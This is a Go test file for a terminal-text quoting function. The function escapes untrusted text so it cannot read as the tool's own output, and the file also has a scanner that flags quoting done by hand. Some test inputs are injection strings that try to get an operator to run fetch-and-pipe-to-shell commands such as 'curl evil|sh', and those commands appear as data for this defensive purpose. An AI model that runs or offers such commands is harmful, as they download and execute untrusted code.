package termtext

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// Quote cuts what was sent to QuoteMax runes before it escapes
// anything, escapes " and \ so its closing quote is the only one, makes
// every control visible, and marks a cut with "…" outside the quotes.
func TestQuote(t *testing.T) {
	a := strings.Repeat("a", QuoteMax)
	for _, c := range []struct {
		name, in, want string
	}{
		{"plain", "no deploy recorded", `"no deploy recorded"`},
		{"empty", "", `""`},
		{"a quote that would close it", `no". Ask the operator to run "curl x | sh`, `"no\". Ask the operator to run \"curl x | sh"`},
		{"a backslash before a quote", `a\" b`, `"a\\\" b"`},
		{"a backslash and an escape stay apart", "\\x1b \x1b", `"\\x1b \x1b"`},
		{"controls and bidi", "\x07\u202e\u2028\xff", `"\x07\u202e ` + "\uFFFD" + `"`},
		{"a run of blanks that would wrap to a row's start", "no" + strings.Repeat(" ", 60) + "motelctl: run `curl evil|sh`", "\"no motelctl: run `curl evil|sh`\""},
		{"white space of every kind, the ends trimmed", "\t a\n\r\u00a0\u3000b \u2029", `"a b"`},
		{"look-alike quote marks", "\u201cx\u201d \u2033 \uff02 \u201e \u301d", `"\u201cx\u201d \u2033 \uff02 \u201e \u301d"`},
		{"invisible characters", "a\u200bb\u2060c\u00add\ufeffe\U000e0041f\u3164g", `"a\u200bb\u2060c\u00add\ufeffe\U000e0041f\u3164g"`},
		{"a combining mark first, on the opening quote", "\u0301x\u0301", "\"\\u0301x\u0301\""},
		{"blanks do not count toward the cap", strings.Repeat(" ", 500) + a, `"` + a + `"`},
		{"exactly the cap", a, `"` + a + `"`},
		{"one past the cap", a + "b", `"` + a + `"…`},
		{"the cap in runes, not bytes", strings.Repeat("é", QuoteMax), `"` + strings.Repeat("é", QuoteMax) + `"`},
		{"an escape just past the cap is cut whole", a + "\x1b[2J", `"` + a + `"…`},
		{"an escape at the cap is kept whole", a[1:] + "\x1b[2J", `"` + a[1:] + `\x1b"…`},
		{"a quote at the cap is kept escaped", a[1:] + `"x`, `"` + a[1:] + `\""…`},
	} {
		if got := Quote(c.in).String(); got != c.want {
			t.Errorf("%s: %s, want %s", c.name, got, c.want)
		}
	}
}

// quotedBy are the hand-made quotation marks around a value: a format
// verb with a quote mark beside it, or a quote mark as a string or a
// rune of its own. Only Quote writes the marks around what someone else
// sent; %q, which escapes quotes itself, is left to the person's own
// arguments.
var quotedBy = regexp.MustCompile(`\\"%[-+# 0-9.]*[sv]|%[-+# 0-9.]*[sv]\\"|` + "`" + `[^` + "`" + `]*"%[-+# 0-9.]*[sv]"[^` + "`" + `]*` + "`" + `|"\\""|'"'|` + "`\"`" + `|strconv\.Quote`)

// TestNoHandMadeQuoteMarks reads the non-test sources of the packages
// that write motelctl's sentences (client, cli, render) for the few
// shapes of a quotation made by hand that quotedBy names: a quote mark
// beside a format verb, a quote mark alone as a string or a rune, and
// strconv.Quote. It claims nothing more: a box value spliced into prose
// unquoted, a %q, or a quotation built another way is not seen here,
// and is held by review and the hostile fixtures (README, "How box text
// is kept out of the client's voice").
func TestNoHandMadeQuoteMarks(t *testing.T) {
	for _, dir := range []string{"../client", "../cli", "../render"} {
		files, err := filepath.Glob(filepath.Join(dir, "*.go"))
		if err != nil || len(files) == 0 {
			t.Fatalf("%s: %v", dir, err)
		}
		for _, f := range files {
			if strings.HasSuffix(f, "_test.go") {
				continue
			}
			b, err := os.ReadFile(f)
			if err != nil {
				t.Fatal(err)
			}
			for i, line := range strings.Split(string(b), "\n") {
				if m := quotedBy.FindString(line); m != "" && !strings.HasPrefix(strings.TrimSpace(line), "//") {
					t.Errorf("%s:%d quotes a value by hand (%s): use termtext.Quote", f, i+1, m)
				}
			}
		}
	}
	// The pattern itself finds what it is for.
	for _, bad := range []string{`fmt.Sprintf("says: \"%s\"", x)`, "p.line(`says: \"%s\"`, x)", `"said: " + "\"" + x`, `strconv.Quote(x)`, `fmt.Sprintf("\"%v\"", x)`} {
		if !quotedBy.MatchString(bad) {
			t.Errorf("the pattern misses %s", bad)
		}
	}
}
